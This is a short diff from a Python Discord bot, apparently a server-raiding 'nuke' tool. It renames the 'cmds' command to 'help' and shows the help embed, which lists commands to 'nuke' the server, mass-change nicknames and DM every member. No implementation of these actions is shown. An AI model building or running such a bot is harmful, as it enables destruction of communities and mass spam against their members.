@@ -35,13 +35,13 @@ async def stop(ctx):
     print (Fore.GREEN + f"{bot.user.name} has logged out successfully.")
 
 @bot.command()
-async def cmds(ctx):
+async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)
 
  embed.set_author(name="Nuke Commands", icon_url=ctx.author.avatar_url)
  
- embed.add_field(name="cmds", value="Shows this message.", inline=False)
+ embed.add_field(name="help", value="Shows this message.", inline=False)
  embed.add_field(name="nuke", value="Nukes the server.", inline=False)
  embed.add_field(name="nick <nickname>", value="Mass nickname change.", inline=False)
  embed.add_field(name="message <message>", value="Dms everyone.", inline=False)
